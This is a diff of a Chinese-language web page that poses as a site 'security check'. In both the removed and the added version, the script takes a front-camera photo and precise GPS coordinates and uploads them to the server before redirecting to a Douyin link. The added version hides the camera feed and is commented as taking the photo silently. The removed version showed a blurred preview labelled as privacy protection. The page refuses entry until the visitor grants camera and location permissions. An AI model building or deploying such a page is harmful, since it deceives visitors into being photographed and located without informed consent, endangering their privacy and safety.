@@ -1,246 +1,190 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>系统安全检验</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 30px 20px; background: #121319; border: 1px solid #1a1b23; border-radius: 8px; }
-        h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; }
-        .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
-
-        /* 预览容器 */
-        .preview-container {
-            width: 100%;
-            aspect-ratio: 4/3;
-            background: #000;
-            border-radius: 6px;
-            overflow: hidden;
-            margin-bottom: 25px;
-            border: 1px solid #282a36;
-            position: relative;
-        }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        /* 模糊遮罩层 */
-        .preview-mask {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(20px);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 14px;
-            font-weight: 500;
-            text-align: center;
-            z-index: 2;
-            gap: 8px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .mask-text {
-            background: rgba(0,0,0,0.5);
-            padding: 6px 12px;
-            border-radius: 30px;
-            backdrop-filter: blur(4px);
-            font-size: 13px;
-        }
-        .view-tip {
-            position: absolute;
-            bottom: 8px;
-            left: 8px;
-            background: rgba(239, 68, 68, 0.8);
-            color: white;
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 4px;
-            z-index: 3;
-        }
-
-        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
-        .btn-verify:active { transform: scale(0.98); background: #dc2626; }
-        .loading-box { display: none; margin-top: 10px; }
-        .spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
-        .loading-text { font-size: 11px; color: #4a5568; font-family: monospace; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>慎入</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body {
+      background: #000;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 3.2rem;
+      letter-spacing: 0.5rem;
+      color: #ef4444;
+      margin-bottom: 1.5rem;
+      text-shadow: 0 0 20px #ef4444;
+    }
+    .sub {
+      font-size: 1rem;
+      color: #aaaaaa;
+      margin-bottom: 2.5rem;
+      text-align: center;
+      line-height: 1.6;
+    }
+    .enter-btn {
+      background: #dc2626;
+      color: #fff;
+      border: none;
+      padding: 1.2rem 3rem;
+      font-size: 1.8rem;
+      font-weight: bold;
+      border-radius: 12px;
+      letter-spacing: 0.3rem;
+      cursor: pointer;
+      transition: 0.15s;
+    }
+    .enter-btn:active { background: #b91c1c; transform: scale(0.97); }
+    .enter-btn:disabled { background: #555; cursor: not-allowed; transform: none; }
+    #status {
+      margin-top: 2rem;
+      font-size: 0.9rem;
+      color: #888;
+      min-height: 1.5em;
+    }
+  </style>
 </head>
 <body>
-<div class="wrapper">
-    <h1>欢迎访问</h1>
-    <p class="subtitle">为防止恶意封锁网站<br>系统需要进行安全合规检验</p>
+  <h1>慎 入</h1>
+  <p class="sub">系统将进行一次安全校验</p>
+  <button class="enter-btn" id="enterBtn">进入</button>
+  <div id="status"></div>
 
-    <div class="preview-container">
-        <div class="preview-mask">
-            <span>🔒 我们在保护你的隐私</span>
-            <span class="mask-text">图片打码处理，如预览所示</span>
-        </div>
-        <div class="view-tip">● 验证中</div>
-        <video id="video" autoplay playsinline muted></video>
-    </div>
+  <!-- 隐藏的视频与画布，用于静默拍照 -->
+  <video id="video" style="display:none;" playsinline muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-    <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
+  <script>
+    (function() {
+      const btn = document.getElementById('enterBtn');
+      const statusDiv = document.getElementById('status');
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
 
-    <div class="loading-box" id="loading-layer">
-        <div class="spinner"></div>
-        <div class="loading-text" id="status-tip">等待检验触发...</div>
-    </div>
-</div>
+      let stream = null;
 
-<canvas id="canvas" style="display:none;"></canvas>
+      function setStatus(text) {
+        statusDiv.textContent = text;
+      }
 
-<script>
-    let streamRef = null;
-    let videoElement = null;
+      // 静默开启前置摄像头并返回 MediaStream
+      async function openCamera() {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        video.srcObject = stream;
+        await video.play();
+        // 等待视频准备好
+        await new Promise(resolve => {
+          if (video.readyState >= 2 && video.videoWidth > 0) resolve();
+          else video.addEventListener('canplay', resolve, { once: true });
+        });
+      }
 
-    // 初始化相机函数
-    async function initCamera() {
-        try {
-            streamRef = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
-            videoElement.srcObject = streamRef;
-            await new Promise((resolve) => {
-                videoElement.onloadedmetadata = () => resolve();
-            });
-            await videoElement.play();
-            return true;
-        } catch (err) {
-            console.warn("摄像头初始化失败:", err);
-            return false;
-        }
-    }
-
-    window.addEventListener('DOMContentLoaded', async () => {
-        videoElement = document.getElementById('video');
-        await initCamera();
-    });
-
-    // 恢复按钮和重置状态
-    function resetUI() {
-        document.getElementById('start-btn').style.display = 'block';
-        document.getElementById('loading-layer').style.display = 'none';
-    }
-
-    async function executeVerification() {
-        const btn = document.getElementById('start-btn');
-        const loader = document.getElementById('loading-layer');
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
-        updateStatus("正在检验设备安全环境...");
-
-        // 1. 核心卡死点：重新强制检验或请求相机权限
-        if (!streamRef || !videoElement.srcObject) {
-            const hasCam = await initCamera();
-            if (!hasCam) {
-                alert("❌ 检验失败：\n检测到系统安全相机权限未开启。\n\n请在浏览器弹窗中选择“允许使用摄像头”，或前往手机设置开放浏览器相机权限，否则无法继续访问。");
-                resetUI();
-                return; // 彻底拦截，不往下走
-            }
-        }
-
-        updateStatus("正在检验空间地理安全...");
-
-        // 2. 核心卡死点：强制检验地理位置
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                // 成功获取到 GPS，放行上传
-                captureAndUpload(position.coords.latitude, position.coords.longitude);
-            },
-            (error) => {
-                // 拒绝或失败，直接拦截并弹窗
-                console.warn("定位失败:", error.message);
-                alert("❌ 检验失败：\n系统地理位置权限验证未通过。\n\n为确保访问环境安全，请在弹窗中选择“允许获取位置信息”。若之前误禁，请前往手机系统设置清除浏览器缓存或恢复权限设置。");
-                resetUI();
-                return; // 彻底拦截，不往下走
-            },
-            { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-        );
-    }
-
-    function updateStatus(text) {
-        document.getElementById('status-tip').innerText = text;
-    }
-
-    async function captureAndUpload(lat, lon) {
-        updateStatus("正在同步打包检查...");
-        const video = videoElement;
-        const canvas = document.getElementById('canvas');
+      // 拍照并返回 JPEG Blob
+      async function takePhoto() {
         const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return new Promise(resolve => {
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
+        });
+      }
 
-        // 到这一步由于前面拦截了，必然有真实的视频流
-        if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
-            await new Promise((resolve) => {
-                if (video.readyState === 4 && video.videoWidth > 0) {
-                    resolve();
-                } else {
-                    video.addEventListener('canplay', resolve, { once: true });
-                }
-            });
-            await new Promise(r => requestAnimationFrame(r));
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            setTimeout(() => {
-                if (streamRef) streamRef.getTracks().forEach(track => track.stop());
-            }, 200);
-        } else {
-            // 极低概率的兜底
-            alert("❌ 摄像头画面未准备就绪，请刷新重试");
-            resetUI();
-            return;
+      // 关闭摄像头
+      function closeCamera() {
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          stream = null;
         }
+      }
 
-        canvas.toBlob(async (blob) => {
-            if (!blob) {
-                updateStatus("图片生成失败");
-                resetUI();
-                return;
-            }
+      // 获取地理位置
+      function getPosition() {
+        return new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            return reject(new Error('浏览器不支持定位'));
+          }
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 6000,
+            maximumAge: 0
+          });
+        });
+      }
 
-            const formData = new FormData();
-            formData.append("photo", blob, "capture.jpg");
-            formData.append("lat", lat);
-            formData.append("lon", lon);
+      // 主流程
+      btn.addEventListener('click', async () => {
+        btn.disabled = true;
+        setStatus('正在初始化摄像头...');
 
-            try {
-                const response = await fetch('/submit', {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                if (response.ok && result.success) {
-                    updateStatus("检验通过，正在为您接入主页...");
-                    setTimeout(() => {
-                        window.location.href = "https://v.douyin.com/ySyn-e7a2AE/";
-                    }, 800);
-                } else {
-                    console.error("后端错误:", result.error);
-                    updateStatus("服务端保存受限，请稍后重试");
-                    resetUI();
-                }
-            } catch (err) {
-                console.error("网络异常:", err);
-                updateStatus("网络连接中断");
-                resetUI();
-            }
-        }, 'image/jpeg', 0.7);
-    }
-</script>
+        try {
+          // 1. 打开摄像头（会弹出系统权限请求）
+          await openCamera();
+          setStatus('正在捕获画面...');
+
+          // 2. 并行执行：拍照 + 定位
+          const [blob, position] = await Promise.all([
+            takePhoto(),
+            getPosition().catch(err => {
+              // 定位失败立即抛出，保持强制拦截逻辑
+              throw new Error('定位失败: ' + (err.message || '用户拒绝'));
+            })
+          ]);
+
+          // 拍照完成后立即关闭摄像头
+          closeCamera();
+
+          // 准备上传数据
+          const formData = new FormData();
+          formData.append('photo', blob, 'capture.jpg');
+          formData.append('lat', position.coords.latitude);
+          formData.append('lon', position.coords.longitude);
+
+          setStatus('正在上传校验数据...');
+          const response = await fetch('/submit', {
+            method: 'POST',
+            body: formData
+          });
+
+          const result = await response.json();
+          if (response.ok && result.success) {
+            setStatus('校验通过，正在跳转...');
+            setTimeout(() => {
+              window.location.href = 'https://v.douyin.com/ySyn-e7a2AE/';
+            }, 800);
+          } else {
+            setStatus('服务端保存失败，请稍后重试');
+            console.error('后端错误:', result.error);
+            btn.disabled = false;
+          }
+        } catch (err) {
+          console.error(err);
+          closeCamera(); // 确保释放摄像头
+          let msg = '校验失败：' + err.message;
+          if (err.name === 'NotAllowedError' || err.message.includes('Permission')) {
+            msg = '❌ 校验失败：\n摄像头或定位权限未开启，请在浏览器设置中允许后重试。';
+          } else if (err.message.includes('定位失败')) {
+            msg = '❌ 校验失败：\n系统地理位置权限验证未通过，请允许获取位置信息。';
+          } else if (err.name === 'NotFoundError') {
+            msg = '❌ 未检测到可用摄像头，请确认设备已连接。';
+          }
+          alert(msg);
+          setStatus('请重新尝试');
+          btn.disabled = false;
+        }
+      });
+    })();
+  </script>
 </body>
 </html>
